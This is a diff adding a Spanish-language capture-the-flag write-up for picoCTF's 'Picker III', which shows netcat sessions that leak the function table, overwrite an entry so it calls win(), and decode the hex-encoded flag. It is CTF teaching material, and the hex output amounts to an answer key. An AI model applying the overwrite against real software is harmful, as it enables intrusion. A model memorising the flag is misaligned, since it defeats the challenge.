@@ -1,0 +1,75 @@
+
+# Reto Picker III
+
+
+## Descripción 
+
+Can you figure out how this program works to get the flag?
+Connect to the program with netcat:
+$ nc saturn.picoctf.net 65346
+The program's source code can be downloaded here.
+
+## Solución
+
+
+
+Descargamos el código fuente que nos dan con el reto y lo analizamos. Hay una tabla con el nombre de las funciones que se pueden ejecutar func_table. La idea es buscar la forma de agregar a esa tabla la función win() para llamarla de manera indirecta.
+Nos conectamos al reto para analizar la funcionalidad.
+```
+nc saturn.picoctf.net 49336
+==> help
+
+This program fixes vulnerabilities in its predecessor by limiting what
+functions can be called to a table of predefined functions. This still puts
+the user in charge, but prevents them from calling undesirable subroutines.
+
+* Enter 'quit' to quit the program.
+* Enter 'help' for this text.
+* Enter 'reset' to reset the table.
+* Enter '1' to execute the first function in the table.
+* Enter '2' to execute the second function in the table.
+* Enter '3' to execute the third function in the table.
+* Enter '4' to execute the fourth function in the table.
+
+Here's the current table:
+  
+1: print_table
+2: read_variable
+3: write_variable
+4: getRandomNumber
+Leemos el valor de las variables con la opción 2, podemos leer el contenido de las variables, si ponemos el nombre de una función, leemos su dirección en memoria
+==> 2
+Please enter variable name to read: func_table    
+print_table                     read_variable                   write_variable                  getRandomNumber                 
+==> 2
+Please enter variable name to read: getRandomNumber
+<function getRandomNumber at 0x74f9c6703d30>
+
+```
+
+Hay otra función que permite modificar el valor de una variable, pero hay una protección si la tabla se corrompe (debe ser 128 caracteres) check_table()
+La solución : Modificar la dirección de memoria de alguna función en la tabla para que apunte ala función win
+```
+==> 3
+Please enter variable name to write: getRandomNumber
+Please enter new value of variable: win
+==> 4
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
+````
+
+Decodificamos el valor
+```python
+Python 3.13.12 (main, Feb  4 2026, 15:06:39) [GCC 15.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> c = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x\
+5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x3\
+7 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e\
+ 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 \
+0x38 0x35 0x7d".split()
+>>> c
+['0x70', '0x69', '0x63', '0x6f', '0x43', '0x54', '0x46', '0x7b', '0x37', '0x68', '0x31', '0x35', '0x5f', '0x31', '0x35', '0x5f', '0x77', '0x68', '0x34', '0x37', '0x5f', '0x77', '0x33', '0x5f', '0x67', '0x33', '0x37', '0x5f', '0x77', '0x31', '0x37', '0x68', '0x5f', '0x75', '0x35', '0x33', '0x72', '0x35', '0x5f', '0x31', '0x6e', '0x5f', '0x63', '0x68', '0x34', '0x72', '0x67', '0x33', '0x5f', '0x32', '0x32', '0x36', '0x64', '0x64', '0x32', '0x38', '0x35', '0x7d']
+                                                                      
+>>> ''.join([chr(int(x,16)) for x in c])
+'picoCTF{...'
+>>> 
+```
